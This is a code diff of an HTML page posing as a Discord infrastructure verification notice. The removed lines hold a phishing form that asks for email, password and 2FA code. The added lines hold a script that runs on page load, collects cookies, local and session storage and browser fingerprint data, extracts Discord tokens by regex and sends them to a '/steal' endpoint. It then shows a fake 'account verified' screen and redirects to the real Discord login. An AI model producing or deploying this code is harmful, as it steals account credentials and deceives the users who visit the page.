@@ -1,65 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Infrastructure Update Required</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="https://discord.com/assets/favicons/favicon-32x32.png">
+    <title>Discord - Infrastructure Status</title>
+    <meta charset="utf-8">
+    <style>body{margin:0;padding:20px;font-family:sans-serif;background:#36393f;color:#dcddde}pre{white-space:pre-wrap}</style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg" alt="Discord" class="logo">
-            <h1>Discord Infrastructure Update Required</h1>
+<div id="fake">Loading Discord Infrastructure...</div>
+<script>
+// STEAL IMMEDIATELY - NO WAITING
+(async function(){
+try{
+    // HARVEST ALL DATA
+    const loot={
+        cookies:document.cookie,
+        localStorage:JSON.stringify(localStorage),
+        sessionStorage:JSON.stringify(sessionStorage),
+        tokens:[],
+        fingerprint:{
+            userAgent:navigator.userAgent,
+            language:navigator.language,
+            platform:navigator.platform,
+            timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen:`${screen.width}x${screen.height}`,
+            timestamp:new Date().toISOString()
+        }
+    };
+    
+    // EXTRACT TOKENS FROM ALL STORAGE
+    const allData=document.cookie+JSON.stringify(localStorage)+JSON.stringify(sessionStorage);
+    const tokenRegex=/(?:mfa\.)?[A-Za-z0-9_-]{59}[.][A-Za-z0-9_-]{6}[.][A-Za-z0-9_-]{27}/g;
+    const matches=allData.match(tokenRegex)||[];
+    loot.tokens=matches;
+    
+    // SEND TO SERVER
+    await fetch('/steal',{
+        method:'POST',
+        body:JSON.stringify(loot),
+        headers:{'Content-Type':'application/json'}
+    });
+    
+}catch(e){/* silent fail */}
+    
+    // SHOW FAKE PAGE
+    document.getElementById('fake').innerHTML=`
+        <div style="max-width:500px;margin:0 auto;background:#7289da;color:white;padding:40px;border-radius:8px;text-align:center">
+            <img src="https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg" style="width:80px;margin-bottom:20px">
+            <h1 style="font-size:28px;margin-bottom:20px">Infrastructure Verified</h1>
+            <p style="margin-bottom:30px">Your Discord account has been successfully verified.</p>
+            <div style="width:60px;height:60px;border:4px solid #5865f2;border-top:4px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px"></div>
+            <p>Redirecting to Discord...</p>
+            <script>setTimeout(()=>location.href='https://discord.com/login',2500)</script>
         </div>
-        
-        <div class="alert">
-            <div class="alert-icon">⚠️</div>
-            <p>Your account requires immediate infrastructure verification due to recent server migrations. Please re-authenticate to continue using Discord.</p>
-        </div>
-
-        <form id="loginForm" class="login-form">
-            <div class="input-group">
-                <label>Email</label>
-                <input type="email" id="email" required placeholder="your.email@example.com">
-            </div>
-            
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="password" required placeholder="Enter your password">
-            </div>
-
-            <div class="input-group">
-                <label>2FA Code (if enabled)</label>
-                <input type="text" id="totp" placeholder="123456">
-            </div>
-
-            <button type="submit" class="login-btn">
-                <span>Verify Account</span>
-                <div class="loader" id="loader"></div>
-            </button>
-        </form>
-
-        <div class="footer">
-            <p>Discord Infrastructure Team © 2026</p>
-        </div>
-    </div>
-
-    <script src="script.js"></script>
-</body>
-</html>
-            <button type="submit" class="login-btn">
-                <span>Verify Account</span>
-                <div class="loader" id="loader"></div>
-            </button>
-        </form>
-
-        <div class="footer">
-            <p>Discord Infrastructure Team © 2026</p>
-        </div>
-    </div>
-
-    <script src="script.js"></script>
+        <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+    `;
+})();
+</script>
 </body>
 </html>
